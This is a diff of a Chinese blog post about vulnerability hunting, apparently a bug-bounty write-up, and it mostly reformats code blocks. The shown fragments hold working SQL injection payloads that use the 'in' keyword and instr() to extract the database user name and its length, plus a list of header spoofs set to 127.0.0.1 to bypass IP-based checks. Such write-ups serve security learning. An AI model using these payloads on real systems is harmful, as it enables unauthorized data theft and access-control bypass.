@@ -1,4 +1,4 @@
-# 比较有意思的几个漏洞挖掘记录
+﻿# 比较有意思的几个漏洞挖掘记录
 
 
 <!--more-->
@@ -29,7 +29,7 @@
 
 最终经过我的不断测试,插入下面 payload 回显特别慢，最终显示数据量太大，不过 in 这个关键字我理解的不是很透彻，有懂的师傅可以解答下
 
-```php
+```sql
 'OR+1+in+1+and+'a'+in+'a
 ```
 
@@ -41,7 +41,7 @@
 
 直接注下 user 的长度
 
-```php
+```sql
 'OR+1+in+length(user)+and+'a'+in+'a
 ```
 
@@ -51,8 +51,13 @@
 
 直接用 instr 函数注用户名
 
-```php
-'OR+1+in+instr(user,'u')+and+'a'+in+'a instr函数代表后面那个字符在前面字符串第一次出现的位置 例如: instr('user','u')返回1 instr('user','us')返回1 instr('user','s')返回2
+```sql
+'OR+1+in+instr(user,'u')+and+'a'+in+'a
+instr函数代表后面那个字符在前面字符串第一次出现的位置
+例如:
+instr('user','u')返回1
+instr('user','us')返回1
+instr('user','s')返回2
 ```
 
 第一位为 S
@@ -130,8 +135,32 @@
 
 这里直接插 xff 头绕过的
 
-```php
-X-Forwarded-For: 127.0.0.1 X-Forwarded:127.0.0.1 Forwarded-For:127.0.0.1 Forwarded:127.0.0.1 X-Requested-With:127.0.0.1 X-Forwarded-Proto:127.0.0.1 X-Forwarded-Host:127.0.0.1 X-remote-lP:127.0.0.1 X-remote-addr:127.0.0.1 True-Client-lP: 127.0.0.1 X-Client-lP:127.0.0.1 Client-lP: 127.0.0.1 X-Real-IP:127.0.0.1 Ali-CDN-Real-IP:127.0.0.1 Cdn-Src-lp:127.0.0.1 Cdn-Real-lp:127.0.0.1 CF-Connecting-lP:127.0.0.1 X-Cluster-Client-lP:127.0.0.1 WL-Proxy-Client-lP:127.0.0.1 Proxy-Client-lP:127.0.0.1 Fastly-Client-lp: 127.0.0.1 True-Client-lp: 127.0.0.1 X-Originating-lP:127.0.0.1 X-Host: 127.0.0.1 X-Custom-lP-Authorization:127.0.0.1
+```
+X-Forwarded-For: 127.0.0.1
+X-Forwarded:127.0.0.1
+Forwarded-For:127.0.0.1
+Forwarded:127.0.0.1
+X-Requested-With:127.0.0.1
+X-Forwarded-Proto:127.0.0.1
+X-Forwarded-Host:127.0.0.1
+X-remote-lP:127.0.0.1
+X-remote-addr:127.0.0.1
+True-Client-lP: 127.0.0.1
+X-Client-lP:127.0.0.1
+Client-lP: 127.0.0.1
+X-Real-IP:127.0.0.1
+Ali-CDN-Real-IP:127.0.0.1
+Cdn-Src-lp:127.0.0.1
+Cdn-Real-lp:127.0.0.1
+CF-Connecting-lP:127.0.0.1
+X-Cluster-Client-lP:127.0.0.1
+WL-Proxy-Client-lP:127.0.0.1
+Proxy-Client-lP:127.0.0.1
+Fastly-Client-lp: 127.0.0.1
+True-Client-lp: 127.0.0.1
+X-Originating-lP:127.0.0.1
+X-Host: 127.0.0.1
+X-Custom-lP-Authorization:127.0.0.1
 ```
 
 这里是创建订单成功了，返回了一个地址，[https://cashier.xxxx.xxxx](https://cashier.xxxx.xxxx/)
